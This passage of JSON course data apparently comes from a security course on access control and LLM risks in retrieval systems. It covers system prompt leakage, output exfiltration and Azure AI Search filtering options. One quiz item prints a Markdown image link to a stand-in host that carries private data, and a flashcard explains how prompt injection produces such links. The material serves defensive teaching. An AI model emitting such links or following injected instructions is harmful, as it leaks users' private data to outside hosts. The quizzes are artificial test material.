useful hint inside a layered design only."}],"flips":[{"if":"No private data can enter the session","then":"The exfiltration risk falls to nuisance level and detection is enough."},{"if":"Users need diagrams and screenshots","then":"Host them behind your own proxy and audit what the proxy forwards."}],"takeaway":"Close the output exit before improving detection."},{"id":"w07-t05-s2","title":"Secrets in the system prompt","situation":"A team put a database connection string and a role table in the system prompt so the model can decide what users may do. A tester extracted the prompt in minutes.","constraints":["Secrets in prompt","Authorization delegated to the model","Prompt extraction is easy"],"unknowns":["Which credentials are in scope?","Where is the real authorization decision made today?"],"question":"What is the fix?","options":[{"name":"Add a line telling the model never to reveal the prompt","verdict":"poor","why":"OWASP says the prompt should not be considered secret, and a refusal rule is bypassable.","tradeoff":"A tone instruction at most."},{"name":"Rotate the credentials, remove them from the prompt, and enforce roles in code outside the model","verdict":"best","why":"It removes the secret and the delegated authorization, which are the real risk in LLM07.","tradeoff":"Needs a role check in the tool or retrieval layer."},{"name":"Encrypt the prompt text before sending it","verdict":"poor","why":"The model must read the prompt, so whatever it reads it can reveal.","tradeoff":"Encryption helps at rest and in transit, not against the model."}],"flips":[{"if":"The prompt holds only tone and format rules","then":"Leakage is low impact and needs no special control."},{"if":"Tools carry privileges","then":"Scope tool credentials to the user, not the prompt."}],"takeaway":"Assume the system prompt is public."},{"id":"w07-t05-s3","title":"Personal data in support answers","situation":"A high-volume support bot retrieves tickets that contain names, phone numbers and account ids. Answers stream to users and the latency target is 400 ms to first token.","constraints":["High volume","Streaming answers","Personal data in retrieved text"],"unknowns":["Must the answer ever show these fields?","Is the ticket's owner always the caller?"],"question":"How do you limit disclosure?","options":[{"name":"Strip or mask personal fields at ingest and enforce ownership in retrieval, with deterministic pattern checks on output","verdict":"best","why":"Data the model never sees cannot be disclosed, and pattern checks add a cheap last line.","tradeoff":"Some answers lose detail the user could legitimately see."},{"name":"Run an LLM judge on every full answer before streaming","verdict":"poor","why":"It destroys the first-token target and multiplies cost.","tradeoff":"Reasonable for rare, high-risk outputs without streaming."},{"name":"Scan streamed text in small windows against patterns for sensitive tiers only","verdict":"good","why":"Keeps latency for most traffic.","tradeoff":"Patterns miss paraphrases and need tuning."}],"flips":[{"if":"The caller owns the data and sees it anyway","then":"Masking adds little. Focus on ownership checks."},{"if":"Answers are batch generated, not streamed","then":"Full-answer scanning becomes affordable."}],"takeaway":"Prevent at ingest and retrieval, then detect at output."}],"quiz":[{"id":"w07-t05-q1","type":"single","tag":"bug","q":"A client auto-renders the model's Markdown. What is the most serious problem in this output?","code":{"lang":"markdown","code":"Here is your summary.\n![status](https://cdn.example.test/p.png?d=ACCOUNT_BALANCE_8841)"},"options":["The image has no alt text","The URL query string carries private data to a third-party host when the client fetches it","Markdown cannot contain images","The sentence is too short"],"answer":1,"explain":"Fetching the image sends the query string to the host, which is the exfiltration. Alt text, Markdown support and length are not the security issue.","ref":"tr4"},{"id":"w07-t05-q2","type":"multi","tag":"security","q":"Which statements match OWASP LLM07 System Prompt Leakage? Choose all that apply.","options":["The system prompt should not be considered a secret","A prompt can be a security control if it is long enough","Sensitive data such as credentials should not be in the prompt","The real risk is delegating authorization to the model"],"answers":[0,2,3],"explain":"OWASP says the prompt is not a secret or a control, credentials do not belong there, and the underlying risk is delegated authorization. Length does not make a prompt a control.","ref":"tr6"}],"flashcards":[{"front":"How does Markdown image exfiltration work?","back":"Injected text makes the model write an image URL whose query string holds private data. The client fetches it automatically and the attacker reads the data from request logs."},{"front":"What does OWASP LLM05 advise for model output?","back":"Treat it as untrusted: encode it for its context, validate before passing downstream, and apply a strict content security policy."},{"front":"Is the system prompt a secret or a control?","back":"Neither, per OWASP LLM07. Keep credentials and authorization logic outside the model, and assume the prompt can be read."}],"related":["w07-t02","w07-t17","w07-t18","w07-t01","w07-l1"],"refs":["r6","tr2","tr4","tr6"]},{"id":"w07-t06","order":6,"group":"Access control options","title":"The ACL decision space","minutes":10,"difficulty":"core","summary":"Five ways to keep unreadable chunks away from a caller: post-filter, pre-filter, physical isolation, live source check and delegation to the source. Four dials choose among them.","useIf":"You must pick where document permissions are enforced and want to see how the choice flips.","avoidIf":"You already know the mechanism and need its details. Open the topic for that option.","explain":[{"t":"p","md":"Every option answers two questions: **which component decides**, and **which stages see text the caller may not read**. A post-filter lets denied text reach your code, rerankers, logs and caches. A pre-filter keeps it inside the index. Four dials choose among the options: the **permission model** (one tag, groups, rich per-document rules), **revocation speed**, **tenancy** and **scale** (how much of the corpus a caller may see)."},{"t":"table","caption":"The options at a glance (checked 2026-10-13)","head":["Option","Decision runs in","Revocation floor","Main limit"],"rows":[["Post-filter","Your code, after top-k","Age of the ACL data you read","Top-k fills with denied hits when access is selective"],["Pre-filter: security filter (GA) or native ACL (preview)","The search engine, before ranking","Sync lag. Pull indexers run every 5 to 1,440 minutes [[r19]]","ACLs must be copied into the index [[r13]] [[r11]]"],["Physical isolation","The index or service boundary","Fast for tenant offboarding, not per user","Index caps: 50 on S1, 200 on S2 and S3, 1,000 per partition on S3 HD [[r20]]"],["Live source check","The system of record, per hit","Seconds, bounded by cache TTL","Latency, source load, failure handling"],["Delegate to the source","The source, with the caller's token","Live","Little control. Retrieval API: 200 requests per user per hour, 25 results [[r26]]"]]},{"t":"p","md":"Tier the data before you choose. Public and low-impact content can use the cheapest option, while a restricted tier may need a live check or a physical wall. Pick the option per tier, state the revocation target for each, and test it with a revoked canary user. Most real systems then combine two options: a pre-filter for the bulk of traffic and a live check on the top hits of restricted tiers. That pairing is design reasoning from the sources, not a vendor prescription."},{"t":"dials","id":"w07-t06-dials","title":"Rank the ACL options","prompt":"Flip the three dials. The ranking and the reason for each cell update.","dials":[{"id":"model","label":"Permission model","values":[{"id":"tag","label":"One tag (tenant)"},{"id":"group","label":"Groups"},{"id":"rich","label":"Rich rules (deny, links)"}]},{"id":"revoke","label":"Revocation needed within","values":[{"id":"hours","label":"Hours"},{"id":"minutes","label":"Minutes"},{"id":"seconds","label":"Seconds"}]},{"id":"scale","label":"Tenancy and scale","values":[{"id":"few","label":"A few big tenants"},{"id":"many","label":"Thousands of small tenants"},{"id":"huge","label":"One org, huge corpus"}]}],"options":[{"id":"post","name":"Post-filter","summary":"Retrieve top-k, then drop what the caller cannot read."},{"id":"pre","name":"Pre-filter in the index","summary":"Security filter (GA) or native ACLs (preview), applied before ranking."},{"id":"hybrid","name":"Pre-filter plus live check","summary":"Filter in the index, then verify the top hits at the source."},{"id":"delegate","name":"Delegate to the source","summary":"The system of record retrieves with the caller's token."},{"id":"wall","name":"Physical wall","summary":"Index or service per tenant."}],"scores":{"post":{"model":{"tag":{"s":-2,"why":"Top-k fills with denied hits."},"group":{"s":-1,"why":"A few percent visible starves recall."},"rich":{"s":0,"why":"Any rule fits in code, top-k is still wasted."}},"revoke":{"hours":{"s":0,"why":"Same lag as any ACL copy."},"minutes":{"s":0,"why":"No fresher than the ACL data it reads."},"seconds":{"s":-1,"why":"Needs a live lookup per hit."}},"scale":{"few":{"s":-1,"why":"Thin slice of a big corpus."},"many":{"s":-2,"why":"Ranks other tenants' text first."},"huge":{"s":-1,"why":"Small visible share per user."}}},"pre":{"model":{"tag":{"s":2,"why":"One equality filter, exact."},"group":{"s":2,"why":"search.in over group ids, before ranking."},"rich":{"s":-1,"why":"Deny rules must flatten to allow lists."}},"revoke":{"hours":{"s":2,"why":"Nightly or hourly sync fits."},"minutes":{"s":1,"why":"Needs frequent pushes or short runs."},"seconds":{"s":-1,"why":"Only with push merge and an event feed."}},"scale":{"few":{"s":1,"why":"Works, big tenants may want a wall."},"many":{"s":2,"why":"Shared index, mandatory tenant filter."},"huge":{"s":1,"why":"Stable recall, but measure it."}}},"hybrid":{"model":{"tag":{"s":0,"why":"Nothing to verify beyond the tag."},"group":{"s":1,"why":"Check catches stale grants."},"rich":{"s":2,"why":"Source decides on the hits that matter."}},"revoke":{"hours":{"s":0,"why":"Latency for freshness you do not need."},"minutes":{"s":1,"why":"Checked hits live, the rest age."},"seconds":{"s":2,"why":"Live for what the user sees."}},"scale":{"few":{"s":1,"why":"A few parallel checks are affordable."},"many":{"s":1,"why":"Source load grows with queries."},"huge":{"s":1,"why":"Budget rate limits and the tail."}}},"delegate":{"model":{"tag":{"s":0,"why":"Your own index can filter a tag."},"group":{"s":1,"why":"Source expands nested groups."},"rich":{"s":2,"why":"Source applies its own rules."}},"revoke":{"hours":{"s":1,"why":"Live, though not needed."},"minutes":{"s":2,"why":"Results reflect the source now."},"seconds":{"s":2,"why":"Live, no copy to sync."}},"scale":{"few":{"s":1,"why":"Works per tenant and licence."},"many":{"s":-1,"why":"Per-user quotas and licensing."},"huge":{"s":1,"why":"No copy, little ranking control."}}},"wall":{"model":{"tag":{"s":2,"why":"Physical boundary, no filter to forget."},"group":{"s":-1,"why":"Nothing for groups inside a tenant."},"rich":{"s":-2,"why":"Per-document rules still need a filter."}},"revoke":{"hours":{"s":0,"why":"Offboarding fast, per-user still syncs."},"minutes":{"s":0,"why":"Same as the filter inside the tenant."},"seconds":{"s":-1,"why":"Does not solve within-tenant revocation."}},"scale":{"few":{"s":2,"why":"Isolation at acceptable cost."},"many":{"s":-2,"why":"Index caps and operations cost."},"huge":{"s":-2,"why":"No tenants to separate."}}}},"takeaway":"No option wins every dial. Pre-filter wins the common group-based case, a live check buys seconds-level revocation, and a wall buys isolation at a cost in scale."},{"t":"lab","id":"acl-simulator","intro":"Compare post-filter, pre-filter, pre-filter plus live check and a per-tenant index on recall, latency and leakage. Start with the group-based preset, then run the three guided experiments."},{"t":"callout","kind":"preview","title":"Preview status, checked 2026-10-13","md":"Only security filters are GA. Native ACL and RBAC scopes, Purview labels and SharePoint ACLs need a preview API, carry no SLA and are not recommended for production by the docs [[r11]]."}],"whereToUse":["Design reviews where the first question is where permissions are enforced","Choosing between a shared index with a filter and an index per tenant","Interview answers that must show one option rarely fits every data tier","Setting a revocation target per sensitivity tier before picking a mechanism"],"whenToUse":{"use":["You can state the permission model, revocation target and tenant count","Different content tiers need different guarantees","You want to compare options by which stage sees denied text"],"avoid":["Picking an option from a product demo before stating the dials","Treating one mechanism as covering every tier of data","Choosing by feature status alone: a preview option can still be the right fit for a pilot"],"flips":["Revocation tightens from hours to seconds: add a live check or delegate","Tenants grow from dozens to thousands: move from a wall to a shared index with a filter","The model moves from groups to deny rules and links: the source must decide"]},"alternatives":{"title":"Combinations practitioners use","head":["Combination","Wins when","Loses when","Cost or risk"],"rows":[["Pre-filter only","Group access, lag is acceptable","Revocation in seconds","Lag between source and index"],["Pre-filter plus live check on top hits","Mixed tiers, some restricted","Source cannot take the query volume","Latency tail, failure handling"],["Delegate to the source","Content lives in a permission-aware store","You need your own ranking and control","Rate limits, licensing, preview billing"],["Wall per big tenant, shared index for the rest","Tenant sizes are skewed","All tenants are small and alike","Two operating models"],["Post-filter only","Index cannot change, nearly all visible","Access is selective","Wasted top-k, wider leak surface"]]},"pitfalls":[{"symptom":"Median users get one result instead of ten","cause":"A post-filter starves top-k at a visible fraction of a few percent","fix":"Filter inside the index, or over-fetch by about 1 divided by the visible fraction and monitor recall"},{"symptom":"A revoked user still sees a document","cause":"The ACL copy is older than the change, or a cache holds the answer","fix":"State a target per tier, shorten sync for restricted data, scope caches by ACL"},{"symptom":"One choice was made for the whole corpus","cause":"Dials were not stated per sensitivity tier","fix":"Tier the data, then pair a pre-filter with a live check for the restricted tier"}],"scenarios":[{"id":"w07-t06-s1","title":"Broad wiki on a fixed search service","situation":"An assistant covers a wiki where about 90% of pages are visible to everyone. Another team manages the search service and it cannot store ACL fields. An entitlement service answers who may read a page. Hourly staleness is fine.","constraints":["Visible fraction about 90%","Index schema cannot change","Hourly staleness is acceptable"],"unknowns":["How many pages per query need an entitlement lookup?","Do candidates reach logs or a reranker first?"],"question":"Where do you enforce permissions?","options":[{"name":"Pre-filter after a re-ingest that adds ACL fields","verdict":"good","why":"It is the better long-term design.","tradeoff":"Needs a schema change you do not control today."},{"name":"Post-filter with about 1.3 times over-fetch, before reranking and logging, with a recall check","verdict":"best","why":"Almost everything is visible, so top-k barely shrinks and no schema change is needed.","tradeoff":"Denied text still reaches your code, so keep it out of logs and caches."},{"name":"One index per user","verdict":"poor","why":"Thousands of users exceed index caps (200 on S2 and S3) and multiply cost [[r20]].","tradeoff":"Only sensible for a handful of principals."}],"flips":[{"if":"The visible fraction drops to 5% or lower","then":"Post-filter starves top-k. Move the filter into the index."},{"if":"The schema becomes changeable","then":"Add a security filter and keep the entitlement check for sensitive pages."}],"takeaway":"Post-filtering is acceptable when almost everything is visible and the index cannot filter."},{"id":"w07-t06-s2","title":"Thousands of small tenants","situation":"A SaaS product serves 4,000 tenants, each with a few thousand documents. Contracts require logical separation and deletion within thirty days. Members of a tenant share one permission level.","constraints":["4,000 small tenants","Logical separation required","One permission level per tenant"],"unknowns":["Is physical separation required by regulation?","Can every query go through one gateway?"],"question":"Which isolation model do you choose?","options":[{"name":"Service per tenant","verdict":"poor","why":"Four thousand services multiply cost and operations.","tradeoff":"Right for a few regulated tenants."},{"name":"Index per tenant on a high-density tier","verdict":"good","why":"Cleaner deletion and per-tenant lifecycle.","tradeoff":"S3 HD allows 1,000 indexes per partition or 3,000 per service, so 4,000 needs a second service [[r20]]."},{"name":"Shared index, with a gateway injecting the tenant filter from the authenticated identity","verdict":"best","why":"It scales to thousands of tenants with one operating model [[r22]].","tradeoff":"One missed filter exposes every tenant, so test with a canary tenant and block direct index access."}],"flips":[{"if":"Three tenants are 100 times larger and regulated","then":"Give those their own service and keep the rest shared."},{"if":"Contracts demand physical separation","then":"A wall per tenant becomes mandatory and cost follows."}],"takeaway":"Many small tenants favour a shared index with an enforced filter."},{"id":"w07-t06-s3","title":"Per-document rules, seconds-level revocation","situation":"Content sits in a document system with per-item permissions, deny rules and sharing links. Security requires a revoked grant to stop working within seconds. Answers cite up to eight documents.","constraints":["Rich per-document rules","Revocation within seconds","Up to 8 cited documents"],"unknowns":["What request rate and latency does the source API allow?","What happens when the source is down?"],"question":"Which design fits?","options":[{"name":"Delegate retrieval to the source with the caller's token","verdict":"good","why":"Always current, and the source applies its own rules.","tradeoff":"Little ranking control and quotas, such as 200 requests per user per hour for the Copilot Retrieval API [[r26]]."},{"name":"Pre-filter only, with a nightly indexer","verdict":"poor","why":"Deny rules are hard to flatten and a nightly sync cannot meet seconds.","tradeoff":"Right when permissions are groups and a day of lag is fine."},{"name":"Pre-filter for recall, then a parallel live check on the top hits, failing closed on timeout","verdict":"best","why":"The source decides on the few documents the user will see, so revocation is live where it counts.","tradeoff":"A latency tail and source load, and a slow source hides documents."}],"flips":[{"if":"Revocation relaxes to a few hours","then":"Drop the live check and rely on the pre-filter."},{"if":"The content already lives in a store with a permission-aware retrieval API","then":"Delegation avoids owning a copy."}],"takeaway":"Live checks buy seconds-level revocation for rich rules."}],"quiz":[{"id":"w07-t06-q1","type":"single","tag":"flip","q":"Revocation must take effect within seconds for per-document rules stored in a source system. Which option moves up?","options":["Pre-filter with a nightly indexer","Post-filter reading the copied ACLs","A live check on the top hits, or delegating retrieval to the source","Index per user"],"answer":2,"explain":"Only a live decision at the source reflects a change in seconds. A nightly sync and a post-filter over copied ACLs inherit the copy's age, and an index per user does not solve per-document rules.","ref":"r19"},{"id":"w07-t06-q2","type":"match","tag":"tradeoff","q":"Match each option to its main limit.","pairs":[{"l":"Post-filter","r":"Top-k fills with denied hits when access is selective"},{"l":"Pre-filter","r":"Lag between a source change and the index"},{"l":"Index per tenant","r":"Index caps and operations cost at thousands of tenants"},{"l":"Delegate to the source","r":"Little ranking control and per-user rate limits"}],"explain":"Each option fails where its mechanism is weakest: post-filtering at low visible fractions, a pre-filter at sync lag, a wall at tenant count, delegation at control and quota.","ref":"r20"}],"flashcards":[{"front":"What two questions does every ACL option answer?","back":"Which component decides, and which stages see text the caller may not read. Post-filters expose denied text to your code, logs and caches. Pre-filters keep it in the index."},{"front":"Name the four dials that choose an ACL option.","back":"Permission model, revocation speed, tenancy and scale (visible fraction, tenant count). Flip one and the ranking can change."},{"front":"Which Azure AI Search document-level approaches are GA as of 2026-10-13?","back":"Only security filters. Native ACL and RBAC scopes, Purview labels and SharePoint ACLs are preview with no SLA."}],"related":["w07-t07","w07-t08","w07-t09","w07-t10","w07-t11","w07-l3","w07-l4"],"refs":["r11","r13","r19","r20","r22","r26"]},{"id":"w07-t07","order":7,"group":"Access control options","title":"Post-filtering","minutes":7,"difficulty":"core","summary":"Retrieve the top candidates first, then drop the ones the caller may not read. It is simple, and it fails when most candidates are denied.","useIf":"Nearly every document is visible to nearly every caller, or the index cannot filter on permissions.","avoidIf":"Access is selective: a caller sees a few percent of the corpus, or denied text must never leave the index.","explain":[{"t":"p","md":"A post-filter runs **after** ranking. The app asks the index for the top candidates, checks each against an ACL source and keeps the allowed ones. The problem is arithmetic. If the caller may read a fraction *f* of the corpus, a top-k list holds about k times *f* allowed documents, and relevance does not care about permissions."},{"t":"formula","title":"Over-fetch for a post-filter","expr":"k_fetch = ceil(k_needed / f)","vars":[{"k":"k_needed","v":"results wanted after filtering"},{"k":"f","v":"visible fraction: the share of the corpus the caller may read"}],"example":"For 10 results, f = 50% needs 20 candidates, f = 10% needs 100 and f = 2% needs 500. This is the lab's model, which assumes relevance is independent of permission: the *ACL decision space* lab shows the group-based case (f = 5%, k = 10, 3x over-fetch) returning a median of 1 result with about 22% empty answers."},{"t":"p","md":"Large over-fetch costs rerank and latency, so **filter immediately after retrieval, before the reranker, logs and caches**. Denied text that reaches those stages is a leak surface even if the user never sees it. That is the main reason a post-filter fails an audit for regulated content."},{"t":"callout","kind":"gotcha","title":"Your pre-filter may be a post-filter","md":"In Azure AI Search, `vectorFilterMode` has three values: `preFilter`, `postFilter` and `strictPostFilter` (preview). New indexes default to `preFilter`, but indexes created before about 2023-10-15 default to `postFilter`, which can miss results for selective filters. `strictPostFilter` finds the global top k first and has the highest risk of false negatives [[tr19]]."},{"t":"table","caption":"Where a post-filter is acceptable","head":["Dial","Acceptable","Not acceptable"],"rows":[["Visible fraction","50% or more","A few percent"],["Data sensitivity","Internal, low impact","Regulated or contractual"],["Index capability","Cannot filter on custom fields","Supports filterable ACL fields"],["Stage order","Filter before rerank, logs, cache","Filter after any of them"]]}],"whereToUse":["Prototypes and small corpora where nearly all content is public to the audience","A search service that cannot be changed to hold ACL fields","A second check after a pre-filter, using the live source for the top few hits","Wikis and handbooks where only a minority of pages are restricted"],"whenToUse":{"use":["The visible fraction is high","You cannot add ACL fields to the index","A permission lookup per candidate is cheap and fast"],"avoid":["Access is selective and top-k must stay full","Denied text must not reach rerankers, logs or caches","Each caller sees a tiny slice of a large corpus"],"flips":["The visible fraction falls below about 10%: move the filter into the index","A regulator or contract forbids denied text outside the index: pre-filter or isolate","A reranker is expensive: filter first or the over-fetch bill grows"]},"alternatives":{"title":"Compared with its neighbours","head":["Option","Wins when","Loses when","Cost or risk"],"rows":[["Post-filter (this topic)","Most documents are visible, index cannot filter","Access is selective","Wasted top-k, empty answers, wider leak surface"],["Pre-filter in the index","Group-based, selective access","Rules cannot be flattened to allow lists","Sync lag, recall to measure"],["Live check on top hits only","Few hits, per-document rights","High query volume","Latency and source load"],["Physical isolation","Tenant boundary is the rule","Per-document rules inside tenants","Cost and limits"]]},"pitfalls":[{"symptom":"Some users get one result or none","cause":"Over-fetch is fixed while their visible fraction is small","fix":"Compute k_fetch from the caller's visible fraction, cap it, and fall back to a pre-filter"},{"symptom":"Restricted text appears in logs and traces","cause":"Candidates were logged before the filter ran","fix":"Filter first, then log ids and decisions only"},{"symptom":"Recall drops although the code never filters in the index","cause":"The index defaults to postFilter for vector queries","fix":"Set vectorFilterMode explicitly and recreate old indexes to use preFilter"}],"scenarios":[{"id":"w07-t07-s1","title":"Five percent visible, top ten required","situation":"An assistant over 2 million chunks needs ten results per query. Callers belong to team groups and see about 5% of the corpus. The search service can filter on a filterable field. The p95 budget is 800 ms.","constraints":["Visible fraction about 5%","Index supports filters","p95 budget 800 ms"],"unknowns":["Can ACL fields be added at ingest?","How often do group memberships change?"],"question":"Where do you filter?","options":[{"name":"Keep the post-filter and fetch 10","verdict":"poor","why":"About half a result survives on average, and many queries return nothing.","tradeoff":"Only works when nearly everything is visible."},{"name":"Post-filter with over-fetch of 200 and an early filter","verdict":"good","why":"Restores result count.","tradeoff":"Ten times the fetch, more reranker load and denied text in your code."},{"name":"Move the permission filter into the index as a security filter","verdict":"best","why":"Ranking sees only allowed chunks, so top-k stays full [[r13]].","tradeoff":"Needs ACL capture at ingest, a sync story and a recall check under selective filters."}],"flips":[{"if":"The visible fraction rises to 80%","then":"A post-filter with small over-fetch is simpler and fine."},{"if":"ACL fields cannot be added to the index","then":"Over-fetch and early filtering is the only option, so cap the cost."}],"takeaway":"At low visible fractions the filter belongs inside the index."},{"id":"w07-t07-s2","title":"Auditors forbid denied text outside the index","situation":"A legal-hold corpus is queried by case teams. Auditors require that restricted text never reaches application logs, rerankers or caches unless the caller may read it. Visibility varies widely.","constraints":["Denied text must stay in the index","Visibility varies","Audit evidence required"],"unknowns":["Which stages log candidate text today?","Can ACLs be copied into the index?"],"question":"Which approach passes the audit?","options":[{"name":"Pre-filter in the index and log only ids and decisions","verdict":"best","why":"Denied text never leaves the engine, and the logs hold no restricted content.","tradeoff":"ACL sync lag must be stated and tested."},{"name":"Post-filter with a very large over-fetch","verdict":"poor","why":"Over-fetch does not change who sees denied text: your code, reranker and logs still do.","tradeoff":"Fine for public content where denied text is not sensitive."},{"name":"Post-filter inside a hardened service that never logs candidates","verdict":"good","why":"Contains the exposure to one trusted component.","tradeoff":"You must prove the isolation and still waste top-k."}],"flips":[{"if":"The index cannot hold ACLs","then":"The hardened post-filter service is the fallback."},{"if":"Only some matters are restricted","then":"Apply the strict path to those matters only."}],"takeaway":"Ask which stage sees denied text, and not only whether the user sees it."},{"id":"w07-t07-s3","title":"Recall drops on an older index","situation":"A team reports poor recall for restricted callers on a vector index created in 2022. Their filter is a security filter and queries use the default settings.","constraints":["Index created before October 2023","Selective filters","Vector queries with default settings"],"unknowns":["What is vectorFilterMode set to?","Was the index ever recreated?"],"question":"What do you do?","options":[{"name":"Switch to strictPostFilter","verdict":"poor","why":"It finds the global top k first and has the highest risk of false negatives for selective filters [[tr19]].","tradeoff":"It is a preview mode and suits cases where global ranking matters more than recall."},{"name":"Recreate the index and set vectorFilterMode to preFilter explicitly","verdict":"best","why":"Older indexes default to postFilter and need to be recreated to use preFilter [[tr19]].","tradeoff":"A rebuild and re-embedding window."},{"name":"Raise k to compensate","verdict":"good","why":"A quick mitigation.","tradeoff":"More candidates per query and still lossy at small visible fractions."}],"flips":[{"if":"Recreating the index is not possible this quarter","then":"Raise k as a stopgap and track recall for restricted callers."},{"if":"The index is newer than October 2023","then":"preFilter is already the default. Look at sync and ACL data instead."}],"takeaway":"Check which filter mode your engine really uses."}],"quiz":[{"id":"w07-t07-q1","type":"numeric","tag":"numeric","q":"A caller may read 4% of the corpus. You need 10 results after a post-filter. About how many candidates must you fetch?","answer":250,"tolerancePct":5,"unit":"candidates","hint":"k_fetch = ceil(k_needed / f)","explain":"10 divided by 0.04 is 250. This assumes relevance is independent of permission, so real numbers vary. It shows why post-filtering gets expensive as f shrinks.","ref":"r13"},{"id":"w07-t07-q2","type":"single","tag":"security","q":"You must keep a post-filter for now. Where should it run?","options":["After the reranker, so only the final list is checked","At the client, after the answer streams","Immediately after retrieval, before the reranker, logs and caches","After the model generates the answer"],"answer":2,"explain":"Filtering first keeps denied text away from rerankers, logs and caches. Later stages already saw it, and a model cannot be trusted to omit what it saw.","ref":"r22"}],"flashcards":[{"front":"What is the over-fetch formula for a post-filter?","back":"k_fetch = ceil(k_needed / f), where f is the visible fraction. At f = 2% and 10 wanted results, fetch 500. It assumes relevance is independent of permission."},{"front":"What does a post-filter expose that a pre-filter does not?","back":"Denied text reaches your code, rerankers, logs and caches before it is dropped. A pre-filter keeps it inside the index."},{"front":"Which Azure AI Search vector filter mode is the default for newer indexes?","back":"preFilter. Indexes created before about 2023-10-15 default to postFilter and must be recreated to use preFilter."}],"related":["w07-t06","w07-t08","w07-l3","w07-l4","w04-t18"],"refs":["r13","r22","tr19"]},{"id":"w07-t08","order":8,"group":"Access control options","title":"Pre-filtering with security filters","minutes":9,"difficulty":"core","summary":"Each chunk stores the identities allowed to read it, and the app adds a search.in filter built from the caller's identities. The engine filters before it ranks. This is the GA, any-API-version pattern in Azure AI Search.","useIf":"Permissions map to users or groups that you can copy onto every chunk, and a sync lag of minutes to hours is acceptable.","avoidIf":"Revocation must take effect in seconds, or access is decided by rules (deny, sharing links) that cannot be flattened into allow lists.","explain":[{"t":"p","md":"A security filter is a plain string-comparison technique: a `Collection(Edm.String)` field on each chunk lists the principals allowed to read it, and the query carries a filter such as `group_ids/any(g:search.in(g, 'id1, id2'))`. It works on any API version and is GA [[r13]]. Because the filter runs before ranking, top-k holds only allowed chunks and recall stays stable."},{"t":"tabs","tabs":[{"label":"Field","blocks":[{"t":"code","lang":"json","title":"Index field","code":"{ \"name\": \"group_ids\", \"type\": \"Collection(Edm.String)\", \"filterable\": true, \"retrievable\": false }"}]},{"label":"Query","blocks":[{"t":"code","lang":"json","title":"POST /docs/search body","code":"{ \"search\": \"parental leave policy\",\n  \"filter\": \"group_ids/any(g:search.in(g, 'a1b2c3, d4e5f6, public'))\",\n  \"vectorFilterMode\": \"preFilter\" }"}]},{"label":"ACL update","blocks":[{"t":"code","lang":"json","title":"Index action that patches only the ACL field","code":"{ \"value\": [ { \"@search.action\": \"merge\", \"id\": \"chunk-42\", \"group_ids\": [\"a1b2c3\"] } ] }"}]}]},{"t":"p","md":"Design the field with care. **The pattern has no authentication**: the principal is only a string, so your code must derive it from a validated token and build the filter server side. `retrievable: false` only hides the field from responses and is not field-level security. Update ACLs with `merge` or `mergeOrUpload`, so a revocation can patch one field without re-embedding [[r13]]."},{"t":"p","md":"`search.in` equals a chain of `eq ... or` but is faster. The docs report sub-second responses with hundreds or thousands of values, no explicit cap on the count, a limit set by the maximum request size, and latency that grows with the number of values [[r14]]. Use POST: a GET URL is limited to 8 KB and the payload to 16 MB [[r20]]. For vector queries set `vectorFilterMode` to `preFilter` explicitly [[tr19]]."},{"t":"callout","kind":"gotcha","title":"Empty means nobody, never everybody","md":"Store an explicit public marker (for example a `public` entry that every caller's list includes). If an empty ACL means public, a failed ACL capture at ingest silently publishes the document."}],"whereToUse":["Enterprise search where permissions are exported from a directory or file share","Multi-department assistants with a department or role tag per chunk","Shared multi-tenant indexes, with the tenant id as one more filtered field","Any system whose identity provider is not Entra, so native token-based ACLs do not apply"],"whenToUse":{"use":["Permissions reduce to allow lists of users or groups","You need GA and a stable API","You own group resolution and ACL sync"],"avoid":["Deny rules, sharing links and guests that cannot be flattened","Revocation in seconds with only a pull indexer","Callers with so many effective groups that the filter grows past the request budget"],"flips":["Revocation must be instant: add a live check on sensitive hits","Content is in ADLS Gen2 or SharePoint and preview is acceptable: consider native ACLs","A caller can hold thousands of groups: send only the groups that appear on documents, or switch to roles"]},"alternatives":{"title":"Compared with its neighbours","head":["Option","Wins when","Loses when","Cost or risk"],"rows":[["Security filter (this topic)","Group-based access, any identity system, GA needed","Rich rules, instant revocation","You write group resolution and sync code"],["Native ACL and RBAC scopes (preview)","Entra identities, ADLS Gen2 or Blob content","You need GA or a non-Entra identity","Preview, no SLA, ACL entry limits"],["Post-filter","Nearly all visible, index cannot filter","Access is selective","Starved top-k, wider leak surface"],["Live check","Per-document rights, fast revocation","High query volume","Latency and source load"]]},"pitfalls":[{"symptom":"A revoked user still sees a document","cause":"The index was not updated after the ACL change","fix":"Push a merge on change events, bound sync lag, and test revocation with a canary user"},{"symptom":"A document with no ACL shows to everyone","cause":"An empty field was treated as public","fix":"Require an explicit public marker and fail closed on empty"},{"symptom":"Filter requests are slow or rejected","cause":"Thousands of group ids in one filter, sent as a GET","fix":"Send POST, expand membership server side and send only groups that appear on documents"},{"symptom":"Users inject their own filter","cause":"The client sends the filter string","fix":"Build the filter only on the server from a validated token"}],"scenarios":[{"id":"w07-t08-s1","title":"Custom identity system, GA required","situation":"A product uses its own directory service, not Entra. Each user belongs to about 120 groups. The assistant goes to production next quarter and requires a supported API. A revoked grant must stop working within 15 minutes.","constraints":["Non-Entra identity","GA required","Revocation within 15 minutes","About 120 groups per user"],"unknowns":["Does the directory emit change events?","How many chunks does one ACL change touch?"],"question":"How do you enforce permissions?","options":[{"name":"Native ACL filters driven by the user's Entra token","verdict":"poor","why":"They are preview, rely on Entra identities and are not recommended for production [[r11]].","tradeoff":"Right when content sits in ADLS Gen2 or SharePoint with Entra identities and a pilot is acceptable."},{"name":"Security filter, with change events from the directory triggering a merge of the ACL field","verdict":"best","why":"GA, works with any identity, and a push merge lands as soon as the change event arrives, well inside 15 minutes.","tradeoff":"You own the change feed and group resolution."},{"name":"Security filter refreshed by a nightly full rebuild","verdict":"good","why":"Simple to run.","tradeoff":"Up to a day of stale grants, which misses the 15-minute target."}],"flips":[{"if":"Revocation tightens to seconds","then":"Keep the filter and add a live check on sensitive hits."},{"if":"The identity system becomes Entra and preview is allowed","then":"Native ACLs remove your group-expansion code."}],"takeaway":"GA plus a custom identity system points to security filters with push updates."},{"id":"w07-t08-s2","title":"Callers with thousands of effective groups","situation":"Large customers have callers who hold up to 3,000 effective groups through nesting. The index has 40 million chunks and documents carry a few hundred distinct principal ids in total.","constraints":["Up to 3,000 groups per caller","Few distinct principals on documents","Sub-second filter latency wanted"],"unknowns":["Which principals actually appear on documents?","How often does membership change?"],"question":"How do you build the filter?","options":[{"name":"Send all 3,000 ids in a GET request URL","verdict":"poor","why":"A GET URL is limited to 8 KB, and latency grows with the value count [[r20]].","tradeoff":"Fine for callers with a handful of 